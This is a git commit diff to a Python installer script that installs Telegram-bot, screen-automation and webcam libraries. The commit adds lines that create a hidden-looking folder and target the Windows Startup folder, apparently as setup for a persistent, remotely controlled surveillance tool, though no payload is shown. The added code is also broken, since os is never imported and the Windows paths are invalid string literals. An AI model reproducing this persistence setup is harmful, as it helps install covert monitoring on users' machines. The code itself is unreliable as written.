15c53daf26894efe954fa343564f3a0f517184f6
DO U PIG <113414349+D0UP1G@users.noreply.github.com>
2023-08-28 16:03:08 +0300

    Update download.py

--- download.py
+++ download.py
@@ -1,5 +1,8 @@
 import subprocess
+import getpass
 
 for i in ['aiogram', 'requests','lxml','pyautogui','opencv-python']:
     process = subprocess.Popen(['pip','install',i])
     process.wait()
+os.mkdir(F'C:\Users\{getpass.getuser()}\Documents\critp')
+os.mkdir(F'C:\Users\{getpass.getuser()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
